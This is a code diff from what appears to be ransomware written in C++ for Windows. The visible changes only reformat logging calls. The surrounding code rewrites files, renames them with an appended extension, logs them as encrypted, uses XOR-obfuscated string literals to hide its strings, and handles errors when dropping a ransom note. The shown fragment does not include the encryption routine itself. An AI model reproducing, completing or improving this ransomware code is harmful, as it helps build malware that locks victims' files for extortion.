@@ -7,7 +7,13 @@ namespace Encryption {
 
         std::ifstream in{ filePathIn, std::ios::binary };
         if (!in.good()) {
-            XorLogger::LogError(std::vformat("{} {}", std::make_format_args(XOR_LIT("Could not open file"), filePathIn)));
+            XorLogger::LogError(std::vformat(
+                "{} {}",
+                std::make_format_args(
+                    const std::string(XOR_LIT("Could not open file")),
+                    filePathIn
+                )
+            ));
             return false;
         }
         std::string content((std::istreambuf_iterator<char>(in)),
@@ -16,18 +22,38 @@ namespace Encryption {
 
         std::ofstream out{ filePathIn, std::ios_base::out | std::ios::binary };
         if (!out.good()) {
-            XorLogger::LogError(std::vformat("{} {}", std::make_format_args(XOR_LIT("Could not open file"), filePathIn)));
+            XorLogger::LogError(std::vformat(
+                "{} {}",
+                std::make_format_args(
+                    const std::string(XOR_LIT("Could not open file")),
+                    filePathIn
+                )
+            ));
             return false;
         }
         out << content;
         out.close();
 
         if (!MoveFile(filePathIn.c_str(), filePathOut.c_str())) {
-            XorLogger::LogError(std::vformat("{} {}. Error code: {}", std::make_format_args(XOR_LIT("Failed to append extension to"), filePathIn, GetLastError())));
+            DWORD errorCode = GetLastError();
+            XorLogger::LogError(std::vformat(
+                "{} {}. Error code: {}",
+                std::make_format_args(
+                    const std::string(XOR_LIT("Failed to append extension to")),
+                    filePathIn,
+                    errorCode
+                )
+            ));
             return false;
         }
 
-        XorLogger::LogDebug(std::vformat("{} {}", std::make_format_args(XOR_LIT("Encrypted and appended extension to"), filePathIn)));
+        XorLogger::LogDebug(std::vformat(
+            "{} {}",
+            std::make_format_args(
+                const std::string(XOR_LIT("Encrypted and appended extension to")),
+                filePathIn
+            )
+        ));
         return true;
     }
 
@@ -52,7 +78,13 @@ namespace Encryption {
             }
         }
         catch (...) {
-            XorLogger::LogError(std::vformat("{} {}", std::make_format_args(XOR_LIT("Unknown exception when processing file"), file_path)));
+            XorLogger::LogError(std::vformat(
+                "{} {}",
+                std::make_format_args(
+                    const std::string(XOR_LIT("Unknown exception when processing file")),
+                    file_path
+                )
+            ));
             return false;
         }
         return true;
@@ -72,7 +104,13 @@ namespace Encryption {
                 if (!out) {
                     DWORD error = ::GetLastError(); // call close as possible to cause of error
                     std::string message = std::system_category().message(error);
-                    XorLogger::LogError(std::vformat(XOR_LIT("Error dropping ransom note ({}): {}"), std::make_format_args(NOTE_FILENAME, message)));
+                    XorLogger::LogError(std::vformat(
+                        XOR_LIT("Error dropping ransom note ({}): {}"),
+                        std::make_format_args(
+                            const std::string(NOTE_FILENAME),
+                            message
+                        )
+                    ));
                     return false;
                 }
             }
